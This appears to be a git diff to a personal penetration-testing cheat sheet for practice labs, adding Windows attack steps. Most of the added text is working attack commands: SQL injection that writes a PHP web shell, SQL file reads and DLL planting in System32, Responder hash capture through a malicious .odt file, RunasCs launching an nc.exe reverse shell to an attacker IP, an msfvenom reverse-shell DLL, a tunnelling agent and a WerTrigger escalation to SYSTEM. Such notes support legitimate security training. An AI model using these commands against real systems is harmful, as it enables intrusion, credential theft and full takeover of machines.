@@ -1446,6 +1446,9 @@ netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'EXEC xp_cmdshell "whoami"
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
 #Now we can exploit it
 http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
+
+#Load the file with sql command [craft2 PG practice](https://www.youtube.com/watch?v=-Y4yrwNx8ww) at 1 hour 10 minutes
+select LOAD_FILE("/Users/Administrator/Desktop/proof.txt") INTO DUMPFILE "C:/temp/proof.txt"; 
 ```
 
 ### SQLMap - Automated Code execution
@@ -2408,6 +2411,30 @@ system($_GET['cmd']);
 </pre>
 # Get admin access
 http://192.168.104.169/cmd.php?cmd=C:\xampp\htdocs\PrintSpoofer64.exe -c "cmd /c powershell -c C:\Windows\Tasks\offsec.ps1"
+```
+### RunasCs switch user with creds windows escalation privileged write
+- User has file upload access .odt extension, created .odt extension with [badodt](https://github.com/rmdavy/badodf/tree/master) to get hash with responder.
+- I have user credentials want to move vertically with [RunasCS](https://github.com/antonioCoco/RunasCs) and nc.exe with credentials mov
+- Clone https://github.com/sailay1996/WerTrigger
+- Copy phoneinfo.dll to C:\Windows\System32\
+- Place Report.wer file and WerTrigger.exe in a same directory.
+- Then, run WerTrigger.exe.
+- Enjoy a shell as NT AUTHORITY\SYSTEM
+
+```powershell
+# Upload file generated from badodt script
+sudo responder -I tun0 # Got the cybergeek creds, got shell apache user
+.\RunasCs.exe thecybergeek winniethepooh "C:\temp\nc.exe 192.168.45.227 4444 -e cmd.exe" -t 0
+rlwrap nc -nlvp 4444 # user is thecybergeek
+
+#PrivEsc user xampp running with root privileges [WerTrigger](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#exploit_1)
+.\agent.exe -connect 192.168.45.227:11601 -ignore-cert
+# port forward get access web phpmyadmin, then access the files
+select LOAD_FILE("C:/Users/Administrator/Desktop/proof.txt") INTO DUMPFILE 'C:/temp/proof.txt'; # able to read the proof.txt no get interactive access.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=4444 -f dll -o phoneinfo.dll
+select LOAD_FILE("/temp/phoneinfo.dll") INTO DUMPFILE 'C:/Windows/System32/phoneinfo.dll'; # Place Report.wer file and WerTrigger.exe in a same directory.
+#So mysql have root access using that copied into windows/system32
+.\WerTrigger.exe # Got admin access
 ```
 
 ### Powershell run command
